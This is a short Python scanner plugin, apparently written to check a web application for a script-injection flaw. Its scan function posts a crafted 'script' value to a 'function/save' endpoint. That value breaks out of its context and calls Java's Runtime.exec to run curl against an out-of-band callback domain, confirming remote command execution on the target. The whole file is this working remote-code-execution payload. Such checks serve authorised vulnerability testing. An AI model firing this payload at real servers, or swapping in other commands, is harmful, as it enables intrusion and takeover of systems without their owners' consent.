import requests,re,urllib3
import sys,os
cwd=os.getcwd()
sys.path.append(cwd+'\\reverse')
from getdomain import get_domain
from getresult import get_result
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	gets=get_domain()
	domain=gets[0]
	token=gets[1]
	url=baseurl+"function/save"
	body="id=&name=cmd&parameter=yw&script=}Java.type('java.lang.Runtime').getRuntime().exec('curl http://"+domain+"');{"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and get_result(domain,token):
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
